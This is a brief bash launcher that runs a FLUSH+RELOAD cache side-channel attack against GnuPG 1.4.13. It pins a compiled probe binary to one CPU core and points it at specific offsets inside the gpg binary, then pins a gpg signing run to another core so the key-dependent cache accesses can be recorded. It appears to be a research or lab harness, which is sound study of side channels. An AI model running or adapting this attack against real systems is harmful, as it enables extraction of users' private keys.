#!/bin/bash
# Script to run FLUSH+RELOAD on GnuPG

export GNUPGHOME="${PWD}/gnupg-1.4.13/home/"

GNUPG="./gnupg-1.4.13/install/bin/gpg"
SFILE="README.md"

rm -f "${SFILE}.sig"

nimble build -d:release >&2

taskset 0x1 ./flush_reload_test \
    -n:20000 -d:2500 \
    "${GNUPG}" \
    662000 660688 657783 \
    &
taskset 0x2 "${GNUPG}" --sign --detach-sig "${SFILE}" >&2

rm -f "${SFILE}.sig"
